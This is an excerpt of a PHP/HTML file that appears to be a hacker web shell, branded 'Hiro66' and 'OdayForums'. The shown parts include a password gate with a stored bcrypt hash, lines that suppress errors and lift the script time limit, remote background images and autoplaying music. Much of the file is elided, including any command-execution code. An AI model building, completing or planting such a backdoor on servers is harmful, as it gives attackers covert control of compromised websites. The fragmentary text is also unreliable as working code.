...
<head>
    ...
    <style>
        body {
            ...
            align-items: center;
            background: url('https://c.top4top.io/p_31400sxlx1.jpg') no-repeat center center;
...
if (!isset($_SESSION['authenticated'])) {
    $stored_hashed_password = '$2a$12$1WVU68EMAQGXkZjdgWoK8.I.NCN6c7/eyI.xf3WDYsTZ6UObgLhjm';
...
body {
    ...
    background: url(https://k.top4top.io/p_3140rtbb31.jpg) center center/cover no-repeat fixed;
    height: 100%;
}
</style>
</body>
...
<center>
<font face="Bungee" size="6"> Shell</font></center>
<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr><td>
<center>
<title="Hiro66" alt="OdayForums" class="center" />
</marquee>
            <hr>
        </font>
        <audio src="https://h.top4top.io/m_3140iv2qx1.mp3" loop="1" controls="1" autoplay="1"></audio><br>
<br><br><br>
<?php
set_time_limit(0);
error_reporting(0);
...
function author() {
        echo "<center><br>COPYRIGHT Hiro66</center>";
        exit();
}
